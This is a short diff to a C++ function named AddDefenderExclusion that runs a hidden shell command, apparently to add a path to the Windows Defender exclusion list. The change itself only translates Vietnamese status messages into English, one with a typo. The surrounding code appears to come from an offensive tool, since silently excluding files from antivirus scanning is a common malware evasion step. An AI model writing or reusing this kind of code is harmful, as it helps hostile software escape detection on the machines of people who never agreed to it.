@@ -67,12 +67,12 @@ bool AddDefenderExclusion(const std::string& path) {
     shExecInfo.lpParameters = param.c_str();
     shExecInfo.nShow = SW_HIDE;
     if (!ShellExecuteExA(&shExecInfo)) {
-        wcout << L"[-] Thêm ngoại lệ thất bại!\n";
+        std::cerr << "[-] Add Defender exclusion failed!\n";
         return false;
     }
     WaitForSingleObject(shExecInfo.hProcess, INFINITE);
     CloseHandle(shExecInfo.hProcess);
-    wcout << L"[+] Đã thêm vào danh sách ngoại lệ của Windows Defender!\n";
+    wcout << L"[+] Add exclusio Windows Defender success!\n";
     return true;
 }
 std::mutex consoleMutex;
